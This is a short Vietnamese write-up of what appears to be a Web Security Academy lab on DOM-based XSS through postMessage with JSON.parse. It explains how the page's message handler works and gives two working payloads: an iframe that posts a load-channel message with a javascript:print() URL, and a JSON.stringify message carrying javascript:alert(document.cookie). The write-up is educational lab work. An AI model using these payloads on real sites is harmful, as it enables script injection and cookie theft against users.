**Yêu cầu: Sử dụng message dạng JSON, tạo 1 page HTML trên máy chủ exploit để gọi được hàm print()/alert()**
<br> Trong source code, đoạn try sử dụng hàm JSON.parse để xác minh input, nếu không hợp lệ sẽ catch return, nếu hợp lệ chạy code ở switch case
![image](https://user-images.githubusercontent.com/62832067/150762156-e3ec3fcd-3972-4de0-a087-b7fb5de2f58e.png)
<br> JSon.parse() trả về mô tả của 1 string, có thể hiểu là trả về "value" của 1 "key", ví dụ như bên dưới ta có string/key **"result"** với mô tả/value là **true**
![image](https://user-images.githubusercontent.com/62832067/150766486-4ec28404-5c47-4369-92b7-c8ea340eae92.png)
<br> Vì thế ta có 2 cách để truyền payload ở bài này:
<br> Cách 1: Sử dụng thẻ iframe và truyền message dạng JSON: ```"<iframe src=https://ace71ff51f8330a2c052863500b400b1.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>```
<br> <br> Cách 2: Sử dụng hàm JSON.stringify để truyền vào input đúng yêu cầu với hàm JSON.parse như bên trên, rồi sau đó khi switch tới case ```load-channel``` thì sẽ gọi tới hàm alert(): 
<br>```JSON.stringify({type: 'load-channel', url: 'javascript:alert(document.cookie)'})``` 



